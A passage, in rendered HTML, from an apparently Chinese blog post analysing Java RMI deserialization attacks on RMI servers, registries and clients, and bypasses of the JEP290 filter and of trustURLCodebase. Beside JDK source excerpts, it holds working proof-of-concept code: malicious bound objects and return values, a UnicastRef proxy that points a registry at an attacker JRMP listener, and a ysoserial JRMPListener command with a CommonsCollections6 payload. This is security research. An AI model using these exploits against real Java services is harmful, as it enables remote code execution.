</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> IRemoteMethod <span class="hljs-title">exploit</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在客户端里放上同样的接口，从注册中心获取远程方法信息，并以恶意对象调用远程方法即可。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    IRemoteMethod remoteMethod = (IRemoteMethod) <span class="hljs-keyword">new</span> InitialContext().lookup(<span class="hljs-string">"rmi://192.168.78.137:1009/RemoteMethod"</span><span class="hljs-string">");</span></span><br><span class="line"><span class="hljs-string">    remoteMethod.exploit(evilObject());</span></span><br><span class="line"><span class="hljs-string">&#125;</span></span><br></pre></td></tr></table></figure><p>对于非Object参数，但又是Object子类的远程方法，可以用动态代理或继承该子类的方法绕过。</p><h3 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h3><h4 id="反序列化注册绑定对象"><a href="#反序列化注册绑定对象" class="headerlink" title="反序列化注册绑定对象"></a>反序列化注册绑定对象</h4><p>当客户端<code>lookup</code>时，也会从注册中心获取并反序列化注册绑定的对象，这时的反序列化是在存根<code>sun.rmi.registry.RegistryImpl_Stub#lookup</code>方法中进行。POC的构造也与注册中心反序列化的差不多，只是改成由注册中心注册绑定恶意类：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="hljs-string">"obj"</span>, evilObject());</span><br><span class="line"></span><br><span class="line">InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);</span><br><span class="line">Remote remoteObj = (Remote) Proxy.newProxyInstance(</span><br><span class="line">    Remote.class.getClassLoader(),</span><br><span class="line">    <span class="hljs-keyword">new</span> Class[]&#123;Remote.class&#125;,</span><br><span class="line">    invocationHandler</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1009</span>);</span><br><span class="line">registry.bind(<span class="hljs-string">"AttackRegistry"</span>, remoteObj);</span><br></pre></td></tr></table></figure><h4 id="反序列化返回值"><a href="#反序列化返回值" class="headerlink" title="反序列化返回值"></a>反序列化返回值</h4><p>当远程方法的返回值不为空，且不为基础类型时，就会对返回值进行反序列化。反序列化返回值与服务端反序列化参数的调用栈类似，最终都是通过<code>sun.rmi.server.UnicastRef#unmarshalValue</code>方法反序列化。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 162526.png" alt></p><p>POC也很简单，远程方法直接返回恶意对象即可：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AttackerRemoteMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IAttackerRemoteMethod</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">exploit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> evilObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JEP290及其绕过"><a href="#JEP290及其绕过" class="headerlink" title="JEP290及其绕过"></a>JEP290及其绕过</h2><p>JEP290是JDK9引入的规范，并且向下兼容到JDK 8u121、JDK 7u131和JDK 6u141。其核心机制是由序列化客户端实现并设置在<code>ObjectInputStream</code>，在反序列化过程中调用过滤器接口方法来验证正在反序列化的类、正在创建的数组的大小以及反序列化的长度、深度和反序列化时引用的数量，返回<code>REJECTED</code>、<code>ALLOWED</code>或<code>UNDECIDED</code>状态。他的过滤接口方法并不是默认配置的，而是通过<code>jdk.serialFilter</code>属性设置全局过滤接口方法或<code>setObjectInputFilter</code>方法设置局部过滤接口方法。</p><p>在RMI反序列化过程中仅注册中心在<code>sun.rmi.registry.RegistryImpl#registryFilter</code>中实现，对反序列化的深度、数组大小和反序列化的类做了限制。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Status <span class="hljs-title">registryFilter</span><span class="hljs-params">(FilterInfo var0)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (registryFilter != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">        Status var1 = registryFilter.checkInput(var0);</span><br><span class="line">        <span class="hljs-keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (var0.depth() &gt; <span class="hljs-number">20L</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        Class var2 = var0.serialClass();</span><br><span class="line">        <span class="hljs-keyword">if</span> (var2 != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (!var2.isArray()) &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> var0.arrayLength() &gt;= <span class="hljs-number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="hljs-number">1000000L</span> ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UnicastRef-类绕过"><a href="#UnicastRef-类绕过" class="headerlink" title="UnicastRef 类绕过"></a>UnicastRef 类绕过</h3><p>UnicastRef 是RMI注册中心反序列化白名单中的类，是正常bind对象后注册中心得到的stub中的属性。</p><p>下面调试下正常的注册流程，直接在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>处，注册中心反序列化服务端bind对象开始。接着调用封装类的父类<code>RemoteObject</code>的自定义<code>readObject</code>方法。在这里会实例化Reference类<code>UnicastRef</code>，并调用他的<code>readExternal</code>反序列化。<code>readExternal</code>里接着调用<code>sun.rmi.transport.LiveRef#read</code>给<code>UnicastRef</code>的<code>ref</code>属性赋值。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">read:291, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:489, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:455, RemoteObject (java.rmi.server)</span><br><span class="line">...</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">dispatch:76, RegistryImpl_Skel (sun.rmi.registry)</span><br></pre></td></tr></table></figure><p><code>sun.rmi.transport.LiveRef#read</code>方法里，主要逻辑是从输入流中获取<code>TCPEndpoint</code>和<code>ObjID</code>，来初始化<code>LiveRef</code>并返回。这里的<code>TCPEndpoint</code>记录着服务端监听的地址和端口，并且方法里保存<code>LiveRef</code>到输入流的操作会将<code>TCPEndpoint</code>保存到输入流的<code>incomingRefTable</code>属性中，这一步很关键。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 121218.png" alt></p><p>反序列化结束后就是注册引用的流程。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 143742.png" alt></p><p>在<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>方法首先利用反序列化的<code>UnicastRef</code>建立连接，返回一个<code>StreamRemoteCall</code>对象，接着调用它的<code>invoke</code>方法。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 144722.png" alt></p><p><code>invoke</code>方法最后调用的是<code>StreamRemoteCall</code>对象的<code>executeCall</code>方法，通过<code>getInputStream</code>方法从<code>conn</code>属性获取输入流赋值给<code>in</code>属性，然后从输入流中获取一个字节赋给<code>var1</code>，进入switch语句中，为2则反序列化输入流。至此与UnicateRef绕过JEP290的流程就结束了。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">executeCall</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    DGCAckHandler var2 = <span class="hljs-keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">byte</span> var1;</span><br><span class="line">    <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">this</span>.getInputStream();</span><br><span class="line">        var1 = <span class="hljs-keyword">this</span>.in.readByte();</span><br><span class="line">        <span class="hljs-keyword">this</span>.in.readID();</span><br><span class="line">    &#125; <span class="hljs-keyword">catch</span> (UnmarshalException var11) &#123;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">switch</span>(var1) &#123;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:</span><br><span class="line">        Object var14;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            var14 = <span class="hljs-keyword">this</span>.in.readObject();</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UnmarshalException(<span class="hljs-string">"Error unmarshaling return"</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于这个<code>var1</code>作用，查了AdoptOpenJDK的源码得知是JRMP协议中返回值的标记，正常返回值不会进行反序列化。UnicastRef绕过JEP290使用ysoserial中的JRMPlistener，其将报错返回改成反序列化的payload，实现命令执行。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-27 160535.png" alt></p><p>最后服务端的代码如下，相比正常的流程可以控制<code>LiveRef</code>指向恶意的服务端ip和端口。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UnicastRefBypass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry reg = LocateRegistry.getRegistry(<span class="hljs-string">"localhost"</span>, <span class="hljs-number">1009</span>);</span><br><span class="line">        ObjID id = <span class="hljs-keyword">new</span> ObjID(<span class="hljs-keyword">new</span> Random().nextInt());</span><br><span class="line">        TCPEndpoint te = <span class="hljs-keyword">new</span> TCPEndpoint(<span class="hljs-string">"10.91.33.139"</span>, <span class="hljs-number">3333</span>);</span><br><span class="line">        UnicastRef ref = <span class="hljs-keyword">new</span> UnicastRef(<span class="hljs-keyword">new</span> LiveRef(id, te, <span class="hljs-keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="hljs-keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(UnicastRefBypass.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="hljs-string">"UnicastRefBypass"</span>, proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UnicastRemoteObject类绕过"><a href="#UnicastRemoteObject类绕过" class="headerlink" title="UnicastRemoteObject类绕过"></a>UnicastRemoteObject类绕过</h3><p>在8u231的修复中，<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前为输入流<code>filter</code>属性设置了过滤接口方法，在后续<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>中又捕获过滤接口方法抛出的<code>InvalidClassException</code>异常，清空输入流中<code>incomingRefTable</code>属性的值。前者使得利用<code>UnicastRef</code>类绕过方式在反序列化<code>Exception</code>返回值时无法反序列化任意类。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-01-28 172121.png" alt></p><p>国外安全研究员An Trinh在8u231版本发布前提出的一种<a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">绕过方式</a>，没有使用注册流程中注册中心发起连接到服务端的输入流，而是利用注册中心在反序列化服务端绑定的对象过程中发起JRMP请求，巧妙地绕过了过滤。</p><p>先从直接反序列化构造的对象来复现下这个POC，首先用ysoserial起一个<code>JRMPListener</code>的exploit。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 &quot;calc&quot;</span><br></pre></td></tr></table></figure><p>然后再现在下面的POC反序列化。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ObjID id = <span class="hljs-keyword">new</span> ObjID(<span class="hljs-keyword">new</span> Random().nextInt());</span><br><span class="line">TCPEndpoint te = <span class="hljs-keyword">new</span> TCPEndpoint(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">3333</span>);</span><br><span class="line">UnicastRef ref = <span class="hljs-keyword">new</span> UnicastRef(<span class="hljs-keyword">new</span> LiveRef(id, te, <span class="hljs-keyword">false</span>));</span><br><span class="line">RemoteObjectInvocationHandler obj = <span class="hljs-keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line"></span><br><span class="line">RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">        <span class="hljs-keyword">new</span> Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,</span><br><span class="line">        obj</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Constructor constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="hljs-keyword">null</span>);</span><br><span class="line">constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">UnicastRemoteObject unicastRemoteObject = (UnicastRemoteObject) constructor.newInstance(<span class="hljs-keyword">null</span>);</span><br><span class="line">Field field = UnicastRemoteObject.class.getDeclaredField(<span class="hljs-string">"ssf"</span>);</span><br><span class="line">field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">field.set(unicastRemoteObject, serverSocketFactory);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Registry reg = LocateRegistry.getRegistry("localhost", 1009);</span></span><br><span class="line"><span class="hljs-comment">// reg.bind("Exploit", unicastRemoteObject);</span></span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(unicastRemoteObject);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">byte</span>[] result = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(result);</span><br><span class="line">ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure><p>调用栈很长，先从<code>java.rmi.server.UnicastRemoteObject#reexport</code>方法开始。当<code>csf</code>或<code>ssf</code>属性非空时，会用<code>csf</code>和<code>ssf</code>实例化一个<code>UnicastServerRef2</code>对象，并调用<code>UnicastServerRef2</code>父类<code>UnicastServerRef</code>的<code>exportObject</code>方法。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 205305.png" alt></p><p><code>UnicastServerRef</code>的<code>exportObject</code>方法就是实现监听端口的操作。后续精彩的部分来了，监听端口的操作会调用<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>方法，其中会调用它的<code>ssf</code>属性的方法，这个<code>ssf</code>属性与前面<code>UnicastRemoteObject</code>对象的<code>ssf</code>属性一致，是封装<code>RemoteObjectInvocationHandler</code>的代理类对象。由于代理类的特性，会先调用<code>RemoteObjectInvocationHandler</code>类的<code>invoke</code>方法。再后面的调用栈与客户端调用远程方法的调用栈一致，也就是原本的注册中心变成了客户端，由于客户端没有启动JEP290设置，也就绕过了注册中心的JEP290限制。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 211158.png" alt></p><p>单在实际注册绑定的过程中，构造的类会在<code>RegistryImpl_Stub</code>的bind方法中，序列化类的输出流<code>ConnectionOutputStream</code>的父类<code>MarshalOutputStream</code>的<code>enableReplace</code>属性永为<code>true</code>，代理类被替换为<code>UnicastRef</code>造成利用链被破坏，所以实际利用中要想办法将<code>enableReplace</code>值改为<code>false</code>。<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>中有实现方法，感兴趣可有看一看。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 212912.png" alt></p><h2 id="trustURLCodebase绕过"><a href="#trustURLCodebase绕过" class="headerlink" title="trustURLCodebase绕过"></a>trustURLCodebase绕过</h2><p>除了以上注册中心JEP290的限制之外，RMI中服务端对客户端的攻击：JNDI注入，使用rmi和ldap协议加载外部工厂类也先后受到<code>trustURLCodebase</code>的限制，只能从本地工厂类实例化对象。</p><h3 id="本地工厂类绕过"><a href="#本地工厂类绕过" class="headerlink" title="本地工厂类绕过"></a>本地工厂类绕过</h3><p>使用本地工厂类进行JNDI注入和RMI协议远程加载恶意类的JNDI注入开头的调用栈基本相似，毕竟两者都是基于RMI协议的，但在<code>javax.naming.spi.NamingManager#getObjectInstance</code>这里开始就有所不同。在调用<code>getObjectFactoryFromReference</code>方法时返回的是本地正常的工厂类，这个工厂类是<code>ObjectFactory</code>的实现类或他的子类，然后调用工厂类的<code>getObjectInstance</code>方法。</p><p>现在比较通用的<code>ObjectFactory</code>实现类是<code>BeanFactory</code>，他的<code>getObjectInstance</code>方法会从<code>ResourceRef</code>对象的<code>className</code>属性获取类名并实例化，然后从forceString的String引用地址以<code>=</code>号分割获取参数名和setter方法名，并反射获取这个setter参数为String的方法，最后获取参数名的String引用地址内内容，用实例化的对象调用这个setter方法。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="hljs-function">    <span class="hljs-keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Reference ref = (Reference) obj;</span><br><span class="line">            String beanClassName = ref.getClassName();</span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="hljs-keyword">null</span>;</span><br><span class="line">            ClassLoader tcl =</span><br><span class="line">                Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="hljs-keyword">if</span> (tcl != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                &#125; <span class="hljs-keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">                    beanClass = Class.forName(beanClassName);</span><br><span class="line">                &#125; <span class="hljs-keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">if</span> (beanClass == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NamingException</span><br><span class="line">                    (<span class="hljs-string">"Class not found: "</span> + beanClassName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="hljs-comment">/* Look for properties with explicitly configured setter */</span></span><br><span class="line">            RefAddr ra = ref.get(<span class="hljs-string">"forceString"</span>);</span><br><span class="line">            Map&lt;String, Method&gt; forced = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            String value;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (ra != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                value = (String)ra.getContent();</span><br><span class="line">                Class&lt;?&gt; paramTypes[] = <span class="hljs-keyword">new</span> Class[<span class="hljs-number">1</span>];</span><br><span class="line">                paramTypes[<span class="hljs-number">0</span>] = String.class;</span><br><span class="line">                String setterName;</span><br><span class="line">                <span class="hljs-keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">                <span class="hljs-comment">/* Items are given as comma separated list */</span></span><br><span class="line">                <span class="hljs-keyword">for</span> (String param: value.split(<span class="hljs-string">","</span>)) &#123;</span><br><span class="line">                    param = param.trim();</span><br><span class="line">                    <span class="hljs-comment">/* A single item can either be of the form name=method</span></span><br><span class="line"><span class="hljs-comment">                     * or just a property name (and we will use a standard</span></span><br><span class="line"><span class="hljs-comment">                     * setter) */</span></span><br><span class="line">                    index = param.indexOf(<span class="hljs-string">'='</span>);</span><br><span class="line">                    <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;</span><br><span class="line">                        setterName = param.substring(index + <span class="hljs-number">1</span>).trim();</span><br><span class="line">                        param = param.substring(<span class="hljs-number">0</span>, index).trim();</span><br><span class="line">                    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                        ...</span><br><span 